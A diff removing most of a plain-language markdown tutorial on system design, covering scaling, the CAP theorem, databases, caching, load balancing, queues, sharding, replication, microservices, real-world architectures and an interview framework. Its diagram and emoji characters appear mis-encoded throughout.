-â”‚ 4 cores  â”‚          â”‚ 4 cores  â”‚  â”‚ 4 cores  â”‚  â”‚ 4 cores  â”‚
-â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜          â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜  â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜  â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
-                              â–²            â–²            â–²
-                              â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
-                                      Load Balancer
-```
-
-âœ… No ceiling â€” just keep adding more  
-âœ… No single point of failure â€” one server dies, others keep going  
-âœ… Cheaper at scale â€” commodity hardware  
-âŒ More complex â€” your app needs to be stateless (no session stored on one machine)  
-âŒ Needs a load balancer  
-âŒ Distributed systems are hard
-
-> **Rule of thumb:** Start vertical, switch to horizontal when vertical gets painful or expensive.
-
----
-
-## 4. Availability â€” how do you stay up?
-
-**Availability** is measured as a percentage of time your system is up and running.
-
-| Availability | Downtime per year | Called                   |
-| ------------ | ----------------- | ------------------------ |
-| 90%          | 36.5 days         | Terrible                 |
-| 99%          | 3.65 days         | Okay                     |
-| 99.9%        | 8.7 hours         | Good ("three nines")     |
-| 99.99%       | 52 minutes        | Very good ("four nines") |
-| 99.999%      | 5 minutes         | Excellent ("five nines") |
-
-Big companies like AWS, Google aim for 99.99% or better. Getting from 99.9% to 99.999% is insanely hard and expensive.
-
-### How do you get high availability?
-
-**Redundancy** â€” don't have a single component that, if it fails, takes everything down.
-
-```mermaid
-graph LR
-    subgraph Bad - Single Point of Failure
-        U1[User] --> S_bad[Server]
-        S_bad --> DB_bad[(Database)]
-    end
-
-    subgraph Good - Redundant
-        U2[User] --> LB2[Load Balancer]
-        LB2 --> S2a[Server A]
-        LB2 --> S2b[Server B]
-        S2a --> DB_primary[(Primary DB)]
-        S2b --> DB_primary
-        DB_primary -- "syncs to" --> DB_replica[(Replica DB)]
-    end
-```
-
-**Failover** â€” when something dies, automatically switch to the backup.  
-**Health checks** â€” constantly ping each component; remove it from rotation if it stops responding.
-
----
-
-## 5. CAP Theorem â€” the impossible triangle
-
-This is one of the most famous ideas in distributed systems. It says:
-
-> **In a distributed system, you can only ever guarantee 2 out of these 3 things at the same time.**
-
-```
-                    â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
-                    â”‚  Consistency    â”‚
-                    â”‚                 â”‚
-                    â”‚ "Every read     â”‚
-                    â”‚  gets the       â”‚
-                    â”‚  latest write"  â”‚
-                    â””â”€â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”˜
-                             â”‚
-                    Pick any â”‚ two
-                            /â”‚\
-                           / â”‚ \
-                          /  â”‚  \
-          â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”   â”‚   â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
-          â”‚ Availability â”‚   â”‚   â”‚  Partition   â”‚
-          â”‚              â”‚   â”‚   â”‚  Tolerance   â”‚
-          â”‚ "System staysâ”‚   â”‚   â”‚              â”‚
-          â”‚  up even if  â”‚   â”‚   â”‚ "Works even  â”‚
-          â”‚  some nodes  â”‚   â”‚   â”‚  if the      â”‚
-          â”‚  fail"       â”‚   â”‚   â”‚  network     â”‚
-          â”‚              â”‚   â”‚   â”‚  splits"     â”‚
-          â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜   â”‚   â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
-```
-
-**In practice:** Network failures (partitions) happen â€” you can't avoid them. So every real system must be Partition Tolerant. That means you're actually choosing between **CP** (consistent but sometimes unavailable) or **AP** (always available but possibly stale).
-
-| Choice | What you get                                                   | Examples                              |
-| ------ | -------------------------------------------------------------- | ------------------------------------- |
-| **CP** | Correct data, but might reject requests during a network split | HBase, MongoDB (by config), Zookeeper |
-| **AP** | Always responds, but might give you slightly old data          | Cassandra, DynamoDB, CouchDB          |
-
-> The classic example: your bank balance should be CP (you'd rather get an error than see the wrong balance). Your Twitter feed can be AP (seeing a tweet 2 seconds late is fine).
-
----
-
-## 6. Databases â€” choosing the right storage
-
-### SQL (Relational) â€” structured, strict, powerful
-
-Think of it like a spreadsheet â€” rows, columns, strict rules. Data lives in tables and rows relate to each other.
-
-```
-Users Table:              Orders Table:
-â”Œâ”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”         â”Œâ”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
-â”‚ ID â”‚ Name     â”‚         â”‚ ID â”‚ User_ID â”‚ Amount   â”‚
-â”œâ”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤         â”œâ”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
-â”‚  1 â”‚ Alice    â”‚â—„â”€â”€â”€â”€â”€â”€â”€â”€â”‚  1 â”‚    1    â”‚  $49.99  â”‚
-â”‚  2 â”‚ Bob      â”‚â—„â”€â”€â”€â”    â”‚  2 â”‚    2    â”‚  $12.50  â”‚
-â””â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜    â””â”€â”€â”€â”€â”‚  3 â”‚    2    â”‚  $99.00  â”‚
-                          â””â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
-```
-
-âœ… ACID guarantees (Atomicity, Consistency, Isolation, Durability)  
-âœ… Powerful JOIN queries  
-âœ… Great for complex relationships  
-âŒ Hard to scale horizontally  
-âŒ Schema changes are painful
-
-**Use SQL when:** You have structured data with clear relationships â€” banking, e-commerce, user accounts.
-
----
-
-### NoSQL â€” flexible, fast, scalable
-
-No fixed schema. Different flavours for different needs.
-
-```mermaid
-graph TD
-    NoSQL["NoSQL Databases"]
-
-    NoSQL --> DocDB["ðŸ“„ Document\n(MongoDB, Firestore)\nStores JSON-like docs\nGood for: user profiles, catalogs"]
-    NoSQL --> KV["ðŸ”‘ Key-Value\n(Redis, DynamoDB)\nLike a dictionary\nGood for: caching, sessions"]
-    NoSQL --> Wide["ðŸ“Š Wide Column\n(Cassandra, HBase)\nFlexible columns per row\nGood for: time-series, IoT data"]
-    NoSQL --> Graph["ðŸ•¸ï¸ Graph\n(Neo4j)\nNodes and edges\nGood for: social networks, fraud detection"]
-```
-
-| Type            | Think of it as                                          | Best for                              |
-| --------------- | ------------------------------------------------------- | ------------------------------------- |
-| **Document**    | A filing cabinet full of folders, each folder different | User profiles, product catalogs       |
-| **Key-Value**   | A massive dictionary / hash map                         | Sessions, caches, leaderboards        |
-| **Wide Column** | A spreadsheet where each row can have different columns | Analytics, logs, time-series          |
-| **Graph**       | A mind map â€” nodes connected by relationships           | Social graphs, recommendation engines |
-
-### ACID vs BASE
-
-| Property | ACID (SQL)                                | BASE (NoSQL)                                        |
-| -------- | ----------------------------------------- | --------------------------------------------------- |
-| **A**    | Atomic â€” all or nothing                   | Basically Available â€” always responds               |
-| **C/S**  | Consistent â€” rules always apply           | Soft state â€” may not be consistent right now        |
-| **I/E**  | Isolated â€” transactions don't interfere   | Eventually consistent â€” will be right... eventually |
-| **D**    | Durable â€” committed data survives crashes | â€”                                                   |
-
-> Banking uses ACID. Your Instagram likes counter uses BASE.
-
----
-
-## 7. Caching â€” stop asking the same question twice
-
-A cache is a layer of fast storage that keeps a copy of data you've recently fetched, so you don't have to go all the way to the database again.
-
-```mermaid
-sequenceDiagram
-    participant U as User
-    participant S as Server
-    participant C as Cache (Redis)
-    participant DB as Database
-
-    Note over C,DB: First request â€” cache is empty
-    U->>S: "Get profile for user 42"
-    S->>C: Check cache
-    C-->>S: âŒ Not found
-    S->>DB: SELECT * FROM users WHERE id=42
-    DB-->>S: {name: "Alice", ...}
-    S->>C: Store in cache (expires in 10 min)
-    S-->>U: Here's Alice's profile
-
-    Note over C,DB: Second request â€” cache has it
-    U->>S: "Get profile for user 42"
-    S->>C: Check cache
-    C-->>S: âœ… Found! {name: "Alice", ...}
-    S-->>U: Here's Alice's profile (10x faster)
-```
-
-### Cache Eviction Policies â€” what to delete when the cache is full?
-
-| Policy                          | How it works                             | Analogy                                          |
-| ------------------------------- | ---------------------------------------- | ------------------------------------------------ |
-| **LRU** (Least Recently Used)   | Remove whatever was accessed longest ago | Throw out the book you haven't touched in months |
-| **LFU** (Least Frequently Used) | Remove whatever is accessed least often  | Throw out the book you've only read once         |
-| **FIFO**                        | Remove oldest entry regardless of use    | Queue â€” first in, first out                      |
-| **TTL**                         | Each entry expires after a set time      | Milk with an expiry date                         |
-
-### Cache Invalidation â€” the hardest problem in CS
-
-> _"There are only two hard things in Computer Science: cache invalidation and naming things."_ â€” Phil Karlton
-
-When the data in your database changes, how does the cache know to update? The main strategies:
-
-```
-Write-Through:          Write-Around:           Write-Back:
-Write to cache AND      Write to DB only.       Write to cache only.
-DB at the same time.    Cache fills on read.    DB updated later.
-
-Consistent âœ…           Cache is cold âš ï¸        Fast writes âœ…
-Slow writes âš ï¸          DB not overwhelmed âœ…   Risk of data loss âš ï¸
-```
-
-### Where to put your cache?
-
-```
-Client-side â†’ Browser caches HTML, images, API responses (localStorage)
-         â†“
-CDN cache â†’ Cloudflare caches your static assets globally
-         â†“
-Server-side â†’ Redis/Memcached sits between your server and DB
-         â†“
-Database â†’ Query result cache inside the DB itself
-```
-
----
-
-## 8. Load Balancers â€” the traffic cops
-
-A load balancer sits in front of your servers and decides which server handles each incoming request.
-
-```
-Without Load Balancer:          With Load Balancer:
-
-All traffic â†’ Server 1          Traffic â†’ Load Balancer
-              (overwhelmed)                    â”‚
-              Server 2 (idle)                  â”œâ”€â”€â–º Server 1 (33%)
-              Server 3 (idle)                  â”œâ”€â”€â–º Server 2 (33%)
-                                               â””â”€â”€â–º Server 3 (33%)
-```
-
-### How does it decide where to send traffic?
-
-| Algorithm                | How it works                                                     | Best for                         |
-| ------------------------ | ---------------------------------------------------------------- | -------------------------------- |
-| **Round Robin**          | Server 1, then 2, then 3, then back to 1...                      | Servers with similar capacity    |
-| **Weighted Round Robin** | Server 1 gets 50%, Server 2 gets 30%, Server 3 gets 20%          | Servers with different power     |
-| **Least Connections**    | Send to whichever server has fewest active connections right now | Long-running requests            |
-| **IP Hash**              | User's IP always goes to the same server                         | When you need session stickiness |
-| **Random**               | Pick any server at random                                        | Simple, works surprisingly well  |
-
-### Layer 4 vs Layer 7
-
-```
-Layer 4 (Transport):            Layer 7 (Application):
-Routes based on IP and port     Routes based on URL, headers, cookies
-Faster (just TCP/UDP)           Smarter (knows about HTTP)
-Can't look inside the request   Can route /api to one server,
-                                /images to another
-```
-
----
-
-## 9. CDN â€” the world is big, servers are slow
-
-A **Content Delivery Network** is a global network of servers that keep copies of your static files (images, videos, CSS, JavaScript) close to your users.
-
-```mermaid
-graph TB
-    Origin["ðŸ¢ Origin Server\n(New York)"]
-
-    EU["ðŸ‡ªðŸ‡º CDN â€” Europe\n(Amsterdam)"]
-    AS["ðŸŒ CDN â€” Asia\n(Singapore)"]
-    AU["ðŸ‡¦ðŸ‡º CDN â€” Australia\n(Sydney)"]
-
-    UserEU["ðŸ‘¤ User in Paris"]
-    UserAS["ðŸ‘¤ User in Tokyo"]
-    UserAU["ðŸ‘¤ User in Sydney"]
-
-    Origin -->|"first request, file stored"| EU
-    Origin -->|"first request, file stored"| AS
-    Origin -->|"first request, file stored"| AU
-
-    UserEU -->|"image loads in 20ms"| EU
-    UserAS -->|"image loads in 15ms"| AS
-    UserAU -->|"image loads in 10ms"| AU
-```
-
-Without CDN: User in Tokyo fetches image from New York â†’ 200ms+ latency  
-With CDN: User in Tokyo fetches image from Singapore â†’ 15ms latency
-
-**CDN handles:**
-
-- Images, videos, CSS, JavaScript files
-- HTML pages that don't change often
-- Large file downloads
-- Live streaming (with streaming CDNs)
-
-**Not good for:**
-
-- Personalized / dynamic content
-- Real-time data (stock prices, chat messages)
-
----
-
-## 10. Message Queues â€” don't do things right now
-
-Sometimes you don't need to do something immediately. You just need to make sure it gets done eventually.
-
-**The problem without queues:**
-
-```
-User uploads photo â†’ Server must:
-  1. Save photo      (0.1s)
-  2. Resize photo    (2s)    â† User is waiting...
-  3. Add watermark   (1s)    â† Still waiting...
-  4. Update DB       (0.1s)  â† Now the UI responds
-  Total: 3.2s of user waiting for things they don't even need to see
-```
-
-**The solution with queues:**
-
-```
-User uploads photo â†’ Server:
-  1. Save original photo    (0.1s)
-  2. Put "process photo" job on queue
-  3. Respond to user: "Upload successful!" â† User is happy in 0.1s
-
-Meanwhile, in the background:
-  Worker picks up job â†’ Resize â†’ Watermark â†’ Done
-```
-
-```mermaid
-graph LR
-    P1["ðŸ“± App Server 1\n(Producer)"]
-    P2["ðŸ“± App Server 2\n(Producer)"]
-    Q["ðŸ“¬ Message Queue\n(RabbitMQ / Kafka / SQS)"]
-    W1["âš™ï¸ Worker 1\n(Consumer)"]
-    W2["âš™ï¸ Worker 2\n(Consumer)"]
-    W3["âš™ï¸ Worker 3\n(Consumer)"]
-
-    P1 -->|"add job"| Q
-    P2 -->|"add job"| Q
-    Q -->|"job assigned"| W1
-    Q -->|"job assigned"| W2
-    Q -->|"job assigned"| W3
-```
-
-### Why queues are great
-
-âœ… **Decoupling** â€” the sender doesn't care who processes it, or when  
-âœ… **Buffering** â€” spike of 50,000 messages? Queue holds them, workers process at their own pace  
-âœ… **Retry** â€” if a worker fails, the message goes back in the queue  
-âœ… **Async** â€” user gets a fast response, heavy work happens later
-
-### Kafka vs RabbitMQ
-
-|                    | Kafka                                                 | RabbitMQ                                           |
-| ------------------ | ----------------------------------------------------- | -------------------------------------------------- |
-| **Model**          | Log-based â€” messages are retained and can be replayed | Traditional queue â€” message deleted after consumed |
-| **Scale**          | Millions of messages/sec                              | Hundreds of thousands/sec                          |
-| **Use case**       | Event streaming, logs, audit trails                   | Task queues, async jobs                            |
-| **Think of it as** | A receipt printer roll â€” keeps all history            | A to-do list â€” tick it off, it's gone              |
-
----
-
-## 11. API Gateway â€” the front door
-
-In a microservices world, you might have 50 different services. You don't want users calling each one directly. The **API Gateway** is the single front door.
-
-```mermaid
-graph LR
-    Client["ðŸ“± Mobile App\n/ Web Browser"]
-
-    GW["ðŸšª API Gateway"]
-
-    Auth["ðŸ” Auth Service"]
-    Users["ðŸ‘¤ User Service"]
-    Orders["ðŸ“¦ Order Service"]
-    Payments["ðŸ’³ Payment Service"]
-    Notifications["ðŸ”” Notification Service"]
-
-    Client -->|"all requests go here"| GW
-    GW -->|"POST /login"| Auth
-    GW -->|"GET /user/42"| Users
-    GW -->|"POST /order"| Orders
-    GW -->|"POST /pay"| Payments
-    GW -->|"any service"| Notifications
-```
-
-The API Gateway does a lot of heavy lifting:
-
-- **Authentication** â€” Is this user logged in? Valid token?
-- **Rate limiting** â€” Has this user made too many requests?
-- **Routing** â€” Which microservice handles this endpoint?
-- **SSL termination** â€” HTTPS ends here; internal traffic is plain HTTP
-- **Request logging** â€” Log everything in one place
-- **Response caching** â€” Cache common responses
-
----
-
-## 12. Rate Limiting â€” slowing down the greedy
-
-Without rate limiting, a single user (or bot) could make millions of requests and bring your system down.
-
-```
-Without rate limiting:          With rate limiting:
-
-Bot fires 100,000 req/s         Bot fires 100,000 req/s
-         â†“                               â†“
-   Server struggles             API Gateway: "You're allowed
-   Legitimate users                100 req/min. You've hit it."
-   get slow responses                      â†“
-   or errors                      First 100 requests: go through
-                                  Rest: âŒ 429 Too Many Requests
-```
-
-### Common algorithms
-
-**Token Bucket** â€” The most common. You have a bucket that fills with tokens at a steady rate (e.g. 10 per second). Each request uses one token. When the bucket is empty, requests are rejected.
-
-```
-Bucket capacity: 100 tokens
-Fill rate: 10 tokens/second
-
-Normal user (5 req/sec):     ðŸª£ Bucket never empties â†’ all good
-Burst user (50 req in 1s):   ðŸª£ Uses 50 tokens â†’ still has 50 left
-Bot (1000 req/sec):          ðŸª£ Empty after 10 requests â†’ 429 error
-```
-
-**Fixed Window** â€” Count requests per fixed time window (e.g. 100 per minute). Simple but has a flaw: someone can send 100 at 11:59 and 100 at 12:00 â€” 200 in 2 seconds.
-
-**Sliding Window** â€” Like fixed window but rolls continuously. Solves the boundary problem. More accurate, slightly more complex.
-
----
-
-## 13. Database Sharding â€” cutting the data pie
-
-What happens when your database gets too big for one machine? You have 10 billion rows â€” queries are slow, disk is full.
-
-**Sharding** splits your data across multiple database machines (shards), each holding a piece.
-
-```mermaid
-graph TD
-    App["Application Server"]
-    Router["Shard Router\n(Which shard has user X?)"]
-
-    DB1["ðŸ—„ï¸ Shard 1\nUsers Aâ€“H\n(2.5 billion rows)"]
-    DB2["ðŸ—„ï¸ Shard 2\nUsers Iâ€“P\n(2.5 billion rows)"]
-    DB3["ðŸ—„ï¸ Shard 3\nUsers Qâ€“Z\n(2.5 billion rows)"]
-
-    App --> Router
-    Router -->|"user starts with A-H"| DB1
-    Router -->|"user starts with I-P"| DB2
-    Router -->|"user starts with Q-Z"| DB3
-```
-
-### Shard Key strategies
-
-| Strategy            | How                                           | Problem                                               |
-| ------------------- | --------------------------------------------- | ----------------------------------------------------- |
-| **Range-based**     | Users A-H â†’ Shard 1, I-P â†’ Shard 2            | Uneven â€” lots of "Smith" â†’ Shard 2 overloaded         |
-| **Hash-based**      | hash(user_id) % 3 â†’ shard number              | Even distribution, but range queries are hard         |
-| **Directory-based** | A lookup table maps each key to a shard       | Flexible, but the lookup table itself is a bottleneck |
-| **Geography-based** | European users â†’ EU shard, Asian â†’ Asia shard | Great for latency + compliance (GDPR)                 |
-
-### The dark side of sharding
-
-âŒ **Cross-shard queries are painful** â€” "find all users who bought product X" now has to query 3 databases and merge results  
-âŒ **No cross-shard transactions** â€” can't do ACID across shards easily  
-âŒ **Resharding is hard** â€” if you add a 4th shard later, you have to move data around  
-âŒ **Complexity** â€” your app now needs to know which shard to talk to
-
-> Only shard when you have to. Most apps never need it.
-
----
-
-## 14. Replication â€” keeping backups alive
-
-Replication is keeping copies of your database on multiple machines. Different goal from sharding â€” sharding splits data, replication duplicates it.
-
-```mermaid
-graph LR
-    W["âœï¸ Write request"] --> Primary["ðŸ—„ï¸ Primary DB\n(read + write)"]
-    Primary -->|"syncs changes"| R1["ðŸ—„ï¸ Replica 1\n(read only)"]
-    Primary -->|"syncs changes"| R2["ðŸ—„ï¸ Replica 2\n(read only)"]
-    Primary -->|"syncs changes"| R3["ðŸ—„ï¸ Replica 3\n(read only)"]
-
-    App["Application"] -->|"all reads"| R1
-    App -->|"all reads"| R2
-    App -->|"all reads"| R3
-    App -->|"all writes"| Primary
-```
-
-### Sync vs Async replication
-
-**Synchronous** â€” Primary waits for replica to confirm before returning "success." Data is always consistent. But slower, and if replica is down, primary is stuck.
-
-**Asynchronous** â€” Primary returns success immediately, replica catches up when it can. Faster, but there's a window where replica might be slightly behind. If primary crashes, you might lose that last bit of data.
-
-### What happens when Primary dies?
-
-**Failover** â€” A replica gets promoted to become the new primary. Either:
-
-- **Automatic failover** â€” System detects primary is gone and promotes a replica (seconds to minutes)
-- **Manual failover** â€” A human intervenes (slower, but more controlled)
-
----
-
-## 15. Microservices vs Monolith
-
-### The Monolith â€” one big app
-
-Everything is one codebase, one deployment, one database.
-
-```
-â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
-â”‚            Monolith App             â”‚
-â”‚                                     â”‚
-â”‚  User Module    Order Module        â”‚
-â”‚  Auth Module    Payment Module      â”‚
-â”‚  Search Module  Notification Module â”‚
-â”‚                                     â”‚
-â”‚           One Database              â”‚
-â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
-         Deployed as one unit
-```
-
-âœ… Simple to develop when small  
-âœ… Easy to test end-to-end  
-âœ… No network calls between modules  
-âœ… One deploy, one place to look  
-âŒ As it grows, becomes a mess  
-âŒ One bug can take down everything  
-âŒ Can only scale the whole thing, even if only one part is slow  
-âŒ Different teams stepping on each other's code
-
----
-
-### Microservices â€” many small apps
-
-Each service is its own independent codebase, database, and deployment.
-
-```mermaid
-graph TB
-    GW["ðŸšª API Gateway"]
-
-    US["ðŸ‘¤ User Service\n(Node.js + PostgreSQL)"]
-    OS["ðŸ“¦ Order Service\n(Python + MongoDB)"]
-    PS["ðŸ’³ Payment Service\n(Java + MySQL)"]
-    NS["ðŸ”” Notification Service\n(Go + Redis)"]
-    SS["ðŸ” Search Service\n(Elasticsearch)"]
-
-    GW --> US
-    GW --> OS
-    GW --> PS
-    GW --> NS
-    GW --> SS
-
-    OS -->|"payment event"| PS
-    PS -->|"payment done event"| NS
-```
-
-âœ… Each service scales independently (Payment service is slow? Scale only that)  
-âœ… One service dying doesn't take down others  
-âœ… Teams work independently  
-âœ… Can use different tech for each service  
-âŒ Network calls between services (latency + failure risk)  
-âŒ Much more complex to manage  
-âŒ Distributed tracing / debugging is hard  
-âŒ Data consistency across services is painful
-
-> **Start with a monolith. Break it into microservices only when the pain is real.**
-
----
-
-## 16. Real World Examples
-
-### How Twitter / X works (simplified)
-
-The hard problem: when a celebrity with 100 million followers tweets, 100 million timelines need updating instantly.
-
-```mermaid
-graph LR
-    User["Celebrity\ntweets"]
-    TW["Tweet Service\n(saves tweet)"]
-    FO["Fanout Service\n(figures out who follows them)"]
-    Q["Message Queue"]
-    W["Timeline Workers\n(millions of writes)"]
-    Cache["Timeline Cache\nfor each user"]
-    R["Read service\n(assembles timeline)"]
-    FU["Followers\nopen app"]
-
-    User -->|"POST /tweet"| TW
-    TW --> FO
-    FO -->|"push to queue"| Q
-    Q --> W
-    W -->|"write to each follower's timeline"| Cache
-    FU --> R
-    R --> Cache
-```
-
-**The tricky part:** If you have 100M followers, writing to all their timelines takes time. Twitter actually has two strategies:
-
-- **Push model (fanout on write)** â€” Pre-compute everyone's timeline when a tweet is posted. Fast reads, expensive writes.
-- **Pull model (fanout on read)** â€” Just store the tweet. When someone opens the app, compute their timeline on the fly. Cheap writes, expensive reads.
-
-Twitter uses a **hybrid** â€” push for normal users, pull for celebrities.
-
----
-
-### How Netflix works (simplified)
-
-The hard problem: serve video to 260+ million subscribers worldwide without buffering.
-
-```
-1. You hit Netflix.com â†’ CDN serves the static page instantly
-2. You search "Stranger Things" â†’ Search service (Elasticsearch)
-3. You hit Play â†’ API Gateway routes to Video Service
-4. Video service checks: what's your internet speed? Device? Location?
-5. Picks the right quality (4K / 1080p / 720p) and codec
-6. Fetches video from the CDN server CLOSEST to you
-7. Every 30 seconds your player reports back stats
-8. If your bandwidth drops, quality automatically lowers (no buffering)
-```
-
-Netflix encodes every show in **dozens of different formats and qualities** in advance, stored on CDN servers in 200+ countries.
-
----
-
-### How Uber works (simplified)
-
-The hard problem: match a driver to a rider in real time, with both moving.
-
-```mermaid
-sequenceDiagram
-    participant R as Rider
-    participant API as API Gateway
-    participant US as User Service
-    participant MS as Matching Service
-    participant DS as Driver Location DB
-    participant D as Driver App
-
-    R->>API: "I need a ride from A to B"
-    API->>US: Authenticate rider
-    API->>MS: Find nearby drivers
-    MS->>DS: Query drivers within 2km of rider
-    DS-->>MS: [Driver 1: 0.5km, Driver 2: 1.2km, ...]
-    MS-->>API: Best match: Driver 1
-    API->>D: "New ride request"
-    D-->>API: "Accepted"
-    API-->>R: "Driver on the way"
-
-    loop Every 4 seconds
-        D->>DS: Update my location
-    end
-```
-
-The driver location system needs to handle millions of location updates every second. Uber uses a custom geospatial index to quickly find drivers near any location.
-
----
-
-## 17. The System Design Interview Playbook
-
-When you're asked to design a system in an interview (or in real life), follow this framework:
-
-```
-Step 1: CLARIFY (5 min)
-â”œâ”€â”€ Who uses it? How many?
-â”œâ”€â”€ What are the core features? (don't try to design everything)
-â”œâ”€â”€ Read-heavy or write-heavy?
-â”œâ”€â”€ Any special requirements? (consistency, latency, global?)
-â””â”€â”€ Scale: requests/sec, data size, user count
-
-Step 2: ESTIMATE (2 min)
-â”œâ”€â”€ Daily active users â†’ requests per second
-â”œâ”€â”€ Data per user â†’ total storage needed
-â””â”€â”€ These rough numbers guide your design choices
-
-Step 3: HIGH LEVEL DESIGN (10 min)
-â”œâ”€â”€ Draw the basic flow: Client â†’ Load Balancer â†’ Servers â†’ DB
-â”œâ”€â”€ Identify the core components needed
-â””â”€â”€ Walk through a typical user request end to end
-
-Step 4: DEEP DIVE (15 min)
-â”œâ”€â”€ Pick the hardest part and go deep
-â”œâ”€â”€ Database schema â€” what tables/documents?
-â”œâ”€â”€ APIs â€” what endpoints?
-â”œâ”€â”€ Where do bottlenecks happen?
-â””â”€â”€ How do you fix them? (cache? shard? queue?)
-
-Step 5: HANDLE EDGE CASES (5 min)
-â”œâ”€â”€ What if the database goes down?
-â”œâ”€â”€ What if traffic spikes 10x suddenly?
-â”œâ”€â”€ What if a region loses connectivity?
-â””â”€â”€ Security â€” how do you prevent abuse?
-```
-
-### Quick cheat sheet
-
-| Problem                                    | Solution                                  |
-| ------------------------------------------ | ----------------------------------------- |
-| Single server overloaded                   | Horizontal scaling + Load Balancer        |
-| Database too slow                          | Cache (Redis) in front of it              |
-| Database too big                           | Sharding                                  |
-| Single point of failure                    | Replication + Failover                    |
-| Users far from server                      | CDN for static, edge servers for dynamic  |
-| Slow user experience from heavy operations | Message Queue + async processing          |
-| Too many services to manage at the front   | API Gateway                               |
-| One service abusing another                | Rate Limiting                             |
-| Need to track everything across services   | Centralised logging + distributed tracing |
-
----
-
-## Key Numbers Every Designer Should Know
-
-These rough numbers help you make quick decisions:
-
-| Operation                                 | Time    |
-| ----------------------------------------- | ------- |
-| L1 cache reference                        | ~0.5 ns |
-| L2 cache reference                        | ~7 ns   |
-| Main memory (RAM) access                  | ~100 ns |
-| SSD random read                           | ~150 Âµs |
-| Network round trip within same datacenter | ~0.5 ms |
-| HDD seek                                  | ~10 ms  |
-| Network round trip cross-continent        | ~150 ms |
-
-> **Rule of thumb:** RAM is 1000x faster than SSD. SSD is 100x faster than HDD. Anything over the network is "slow."
-
----
-
-## Glossary
-
-| Term                        | Plain English                                                             |
-| --------------------------- | ------------------------------------------------------------------------- |
-| **Latency**                 | How long does one request take?                                           |
-| **Throughput**              | How many requests can you handle per second?                              |
-| **Horizontal scaling**      | Add more machines                                                         |
-| **Vertical scaling**        | Make one machine bigger                                                   |
-| **Stateless**               | Server doesn't remember you between requests (enables horizontal scaling) |
-| **Idempotent**              | Doing the same operation twice gives the same result (safe to retry)      |
-| **SLA**                     | Promise to the customer about uptime (e.g. 99.9%)                         |
-| **Hot spot**                | One shard/server getting way more load than others                        |
-| **Single point of failure** | One thing whose failure brings everything down                            |
-| **Fanout**                  | One event triggering writes to many places                                |
-| **Eventual consistency**    | Data will be consistent... but maybe not immediately                      |
 
 ---
 
